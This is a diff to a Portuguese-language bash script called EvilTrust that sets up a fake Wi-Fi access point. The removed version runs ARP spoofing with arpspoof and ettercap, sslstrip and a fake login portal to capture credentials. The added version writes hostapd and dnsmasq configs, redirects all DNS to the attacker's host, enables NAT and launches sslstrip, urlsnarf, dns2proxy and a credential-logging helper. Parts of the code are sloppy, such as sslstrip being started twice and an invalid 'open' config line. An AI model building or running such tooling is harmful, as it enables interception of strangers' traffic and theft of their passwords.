@@ -2,65 +2,77 @@
 # Script por Jeanpseven (wrench)
 # GitHub: jeanpseven
 
-iface=""
+function banner(){
+    echo "EvilTrust - Fake Access Point Script"
+    echo "------------------------------------"
+}
 
-echo -e "[*] Pressione Ctrl+C para encerrar.\n"
+function dependencies(){
+    apt-get -y install xterm
+}
 
-# Mostrar lista de interfaces numeradas
-echo "[*] Lista de Interfaces Disponíveis:"
-interfaces=($(airmon-ng | grep "wlan" | awk '{print $2}'))
-for i in "${!interfaces[@]}"; do
-  echo "[$((i+1))] ${interfaces[$i]}"
-done
+function getCredentials(){
+    read -p "Digite o nome da rede (SSID): " ssid
+    read -p "Digite a senha (deixe em branco para sem senha): " password
+}
 
-# Capturar a escolha do usuário
-read -p "[*] Escolha a interface Wi-Fi (informe o número): " choice
-iface=${interfaces[$((choice-1))]}
+function startAttack(){
+    choosed_interface=$(ifconfig | grep wlan | cut -d ' ' -f 1)
+    use_channel=$(iwlist $choosed_interface channel | grep "Current Frequency" | cut -d '(' -f 2 | cut -d ')' -f 1)
+    echo -e "interface=$choosed_interface\n" > hostapd.conf
+    echo -e "driver=nl80211\n" >> hostapd.conf
+    echo -e "ssid=$ssid\n" >> hostapd.conf
+    if [ -n "$password" ]; then
+        echo -e "wpa_passphrase=$password\n" >> hostapd.conf
+    else
+        echo -e "open\n" >> hostapd.conf
+    fi
+    echo -e "channel=$use_channel\n" >> hostapd.conf
+    echo -e "macaddr_acl=0\n" >> hostapd.conf
+    echo -e "auth_algs=1\n" >> hostapd.conf
+    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
+    echo -e "wpa=3\n" >> hostapd.conf
+    echo -e "wpa_key_mgmt=WPA-PSK\n" >> hostapd.conf
+    echo -e "wpa_pairwise=TKIP\n" >> hostapd.conf
+    echo -e "rsn_pairwise=CCMP\n" >> hostapd.conf
+    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
+    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
+    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
+    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
+    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
+    echo -e "log-queries\n" >> dnsmasq.conf
+    echo -e "log-dhcp\n" >> dnsmasq.conf
+    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
+    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+    echo -e "mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak\n" > dnsmasq.sh
+    echo -e "mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.bak\n" > hostapd.sh
+    echo -e "cp dnsmasq.conf /etc/\n" >> dnsmasq.sh
+    echo -e "cp hostapd.conf /etc/hostapd/\n" >> hostapd.sh
+    echo -e "ifconfig $choosed_interface 192.168.1.1\n" >> hostapd.sh
+    echo -e "service dnsmasq restart\n" >> hostapd.sh
+    echo -e "service hostapd restart\n" >> hostapd.sh
+    echo -e "iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE\n" >> hostapd.sh
+    echo -e "echo 1 > /proc/sys/net/ipv4/ip_forward\n" >> hostapd.sh
+    echo -e "bash utilities/banner.sh\n" >> hostapd.sh
+    echo -e "bash utilities/firewall.sh\n" >> hostapd.sh
+    echo -e "sleep 3; clear\n" >> hostapd.sh
+    chmod +x dnsmasq.sh hostapd.sh
+    xterm -e ./dnsmasq.sh
+    xterm -e ./hostapd.sh
+    xterm -e bash utilities/sslstrip.sh
+    xterm -e bash utilities/urlsnarf.sh
+    xterm -e bash utilities/dns2proxy.sh
+    xterm -e bash utilities/sslstrip.sh
+    sleep 2; bash utilities/banner.sh
+    xterm -e bash utilities/datos.sh
+}
 
-# Listar pastas no diretório do script
-echo -e "\n[*] Pastas Disponíveis no Diretório Atual:"
-folders=($(ls -d */))
-for i in "${!folders[@]}"; do
-  echo "[$((i+1))] ${folders[$i]}"
-done
+function main(){
+    clear
+    banner
+    dependencies
+    getCredentials
+    startAttack
+}
 
-# Capturar a escolha do usuário para a pasta
-read -p "[*] Escolha a pasta para colocar o site falso (informe o número): " folder_choice
-selected_folder=${folders[$((folder_choice-1))]}
-
-# Caminho completo para a pasta selecionada
-site_folder=$(realpath "$selected_folder")
-
-# Mostrar lista de templates numerados
-echo -e "\n[*] Lista de Templates Disponíveis:"
-templates=("template1" "template2" "template3")  # Adicione aqui os nomes dos templates
-for i in "${!templates[@]}"; do
-  echo "[$((i+1))] ${templates[$i]}"
-done
-
-# Capturar a escolha do usuário para o template
-read -p "[*] Escolha o template para a tela falsa (informe o número): " template_choice
-selected_template=${templates[$((template_choice-1))]}
-
-airodump-ng $iface -w "$site_folder/capture" > /dev/null 2>&1 &
-
-sleep 3
-
-xterm -geometry 75x15+1+20 -T "evilTrust - Criando Portal de Login Falso" -e "bash -c 'arpspoof -i $iface -t 10.0.0.1 10.0.0.10'" &
-
-sleep 2
-
-xterm -geometry 75x15+1+40 -T "evilTrust - Redirecionando Tráfego HTTP" -e "bash -c 'sslstrip -f -k -w $site_folder/sslstrip.log'" &
-
-sleep 2
-
-xterm -geometry 75x15+1+60 -T "evilTrust - Iniciando MITM" -e "bash -c 'ettercap -T -q -i $iface -M arp:remote /10.0.0.1// /10.0.0.10-250//'" &
-
-sleep 2
-
-echo -e "\n[*] O evilTrust está ativo. Aguarde até que as credenciais sejam capturadas.\n"
-
-# Usar o template escolhido
-cp -r "$selected_template/"* "$site_folder/"
-
-wait
+main
